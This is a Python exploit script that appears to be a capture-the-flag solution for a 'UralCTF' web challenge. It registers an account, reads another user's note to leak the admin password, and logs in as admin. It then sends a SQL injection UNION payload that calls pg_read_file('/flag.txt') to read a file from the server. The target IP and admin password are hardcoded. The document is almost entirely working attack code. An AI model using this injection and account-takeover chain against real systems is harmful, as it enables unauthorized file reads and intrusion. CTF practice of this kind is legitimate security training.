import requests
import time

def register(s: requests.Session, url: str) -> bool:
    headers = {
        'Connection': 'keep-alive'
    }

    data = {
        'username': 'qwerty123123',
        'email': 'qwerty123123@ctf.ctf',
        'password': 'qwerty123123',
        'confirm_password': 'qwerty123123'
    }
    resp = s.post(f"{url}/register", headers=headers, data=data, timeout=1)
    if resp.status_code == 302:
        return True
    
    return False

def login(s: requests.Session, url: str):
    headers = {
        'Connection': 'keep-alive'
    }

    data = {
        'username': 'qwerty123123',
        'password': 'qwerty123123',
    }

    resp = s.post(f"{url}/login", headers=headers, data=data, timeout=1)
    if resp.status_code == 302:
        return True
    
    return False

def get_admin_password(s: requests.Session, url: str):
    headers = {
        'Connection': 'keep-alive'
    }

    resp = s.get(f"{url}/note/1", headers=headers, timeout=1)
    if resp.status_code == 200:
        password = resp.text.split("Пароль: ")[1].split('<br>')[0]

        return password


def get_admin_session(url: str, admin_password: str) -> requests.Session:
    headers = {
        'Connection': 'keep-alive'
    }

    data = {
        'username': 'admin',
        'password': admin_password,
    }
    s = requests.Session()

    resp = s.post(f"{url}/login", headers=headers, data=data, timeout=1)
    if resp.status_code == 200:
        return s
    

def get_flag(s: requests.Session, url: str) -> str:
    headers = {
        'Connection': 'keep-alive'
    }
    resp = s.get(f'{url}/admin?user_filter=1%20GROUP%20BY%20u.id%20UNION%20SELECT%201,pg_read_file(%27/flag.txt%27),1%20--%20-', headers=headers, timeout=1)
    flag = 'UralCTF' + resp.text.split('UralCTF')[1].split("</td>")[0]
    return flag


if __name__ == '__main__':
    s = requests.Session()
    url = 'http://185.244.173.33:5096'
    while True:
        try:
            print('registering...')
            register(s, url)
            print('login...')
            login(s, url)
            print('obtain password...')
            admin_password = get_admin_password(s, url)
            print(admin_password)
        except:
            print('sleeping')
            time.sleep(65)
            continue
        finally:
            break
    
    while True:
        admin_password = 'my_beautiful_password_123123'
        try:
            print('getting admin session...')
            s = get_admin_session(url, admin_password)
            print('getting flag...')
            flag = get_flag(s, url)
            print(flag)
        except:
            print('sleeping')
            time.sleep(65)
            continue
        finally:
            break